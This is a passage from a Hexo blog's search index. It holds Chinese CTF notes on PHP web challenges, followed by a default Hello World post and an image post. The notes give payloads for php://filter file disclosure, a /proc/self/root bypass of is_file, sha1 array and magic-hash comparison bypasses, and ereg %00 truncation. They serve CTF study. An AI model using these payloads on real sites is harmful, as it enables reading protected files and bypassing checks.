class="hljs-regexp">//</span>压缩流<br></code></pre></td></tr></table></figure><p>伪协议支持多种编码方式，无效的ctfshow就被忽略掉了：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode|ctfshow/</span>resource=flag.php<br>filter<br></code></pre></td></tr></table></figure><p>is_file()函数<br>判断是否为文件</p><p>php伪协议绕过<br>highlight_file()可以识别php伪协议 is_file()不能识别php伪协议</p><p>&#x2F;proc&#x2F;self&#x2F;root<br>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的 也就是如果在命令行中输入 ls &#x2F;proc&#x2F;self&#x2F;root<br>其实显示的内容是根目录下的内容 多次重复后绕过is_file</p><h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1"></a>sha1</h2><h3 id="1数组绕过-1"><a href="#1数组绕过-1" class="headerlink" title="1数组绕过"></a>1数组绕过</h3><p>if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2){<br>      echo $flag;<br>}<br>payload：v1[]&#x3D;1 v2[]&#x3D;2</p><h3 id="2强类型比较"><a href="#2强类型比较" class="headerlink" title="2强类型比较"></a>2强类型比较</h3><p>v1&#x3D;aaK1STf    &#x2F;&#x2F;0e7665852665575620768827115962402601<br>v2&#x3D;aaO8zKZF   &#x2F;&#x2F;0e89257456677279068558073954252716165</p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><p>parse_str() 函数把查询字符串解析到变量中。<br>若要post参数，需加引号，如：<br><code>v1=&#39;flag=0&#39;</code></p><h2 id="ereg-截断漏洞"><a href="#ereg-截断漏洞" class="headerlink" title="ereg()截断漏洞"></a>ereg()截断漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])===<span class="hljs-literal">FALSE</span>)  &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))==<span class="hljs-number">0x36d</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload: c&#x3D;a%00778<br>反转后：c&#x3D;877&#x3D;0x36d<br><strong>strrev()</strong><br>反转字符串，常出现在%00截断漏洞中<br>注：%00是一个整体，不会反转成00%</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪协议</title>
    <link href="/2023/03/28/1/"/>
    <url>/2023/03/28/1/</url>
    
    <content type="html"><![CDATA[<p>filter协议的简单利用：<br>想要读取flag.php文件，可以利用filter伪协议，传参如下：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>这样即可读到flag.php文件base64加密过后的内容</p><p>除了使用convert.base64-encode过滤器，还可以使用其他的一些过滤器，比如字符编码类型的，payload如下：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/03/03/hello-world/"/>
    <url>/2023/03/03/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>wlop</title>
    <link href="/2023/03/03/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2023/03/03/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<img src="/2023/03/03/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/CAA685C915408AAB5DA052E2A43757CD.jpg" class>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
